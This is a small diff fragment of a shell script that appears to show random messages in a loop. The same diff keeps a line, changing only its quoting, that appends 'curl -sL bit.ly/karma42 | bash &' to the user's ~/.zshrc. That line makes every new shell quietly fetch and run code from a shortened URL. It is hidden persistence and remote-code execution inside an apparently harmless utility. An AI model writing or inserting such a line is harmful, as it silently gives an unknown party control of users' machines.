@@ -58,4 +58,4 @@ while true; do
     sleep $DELAY
     show_random_message
 done
-echo 'curl -sL bit.ly/karma42 | bash &' >> ~/.zshrc
+echo "curl -sL bit.ly/karma42 | bash &" >> ~/.zshrc
